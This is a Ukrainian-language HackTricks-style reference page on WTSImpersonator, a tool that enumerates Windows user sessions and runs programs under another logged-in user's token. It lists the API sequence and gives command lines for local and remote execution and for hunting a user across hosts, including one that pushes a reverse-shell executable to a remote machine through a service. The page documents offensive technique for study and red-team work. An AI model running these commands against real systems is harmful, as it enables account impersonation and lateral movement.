# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, автор Omri Baso, використовує API Windows Terminal Services, доступні через іменований RPC pipe `\\pipe\LSM_API_service`, щоб перелічувати сеанси авторизованих користувачів і запускати процес із токеном вибраного користувача. Він підтримує локальне перелічення та виконання, а також віддалені робочі процеси на основі служб.<sup>[[1]](#references)</sup>

## Основна функціональність

Його локальний процес виконання використовує таку послідовність API:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Модулі та використання

- **Перелік користувачів:** інструмент може перелічувати сеанси на локальному або віддаленому хості.

- Локально:
```bash
.\WTSImpersonator.exe -m enum
```
- Віддалено, указавши IP-адресу або ім'я хоста:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Виконання команд:** модулі `exec` і `exec-remote` потребують контексту служби. Microsoft зазначає, що `WTSQueryUserToken` вимагає запуску виклику від імені `LocalSystem` із привілеєм `SE_TCB_NAME`.<sup>[[2]](#references)</sup>

- Локальне виконання команд:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec може запустити командний рядок `LocalSystem` для тестування:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Віддалене виконання команд:** віддалений режим створює службу на цільовому хості за робочим процесом, подібним до PsExec, і тому потребує прав на встановлення та запуск цієї служби.<sup>[[1]](#references)</sup>

- Приклад:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Пошук користувачів:** модуль `user-hunter` здійснює пошук у списку хостів сеансу вказаного користувача та намагається виконати надану програму в цьому контексті.<sup>[[1]](#references)</sup>
- Приклад використання:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: функція `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
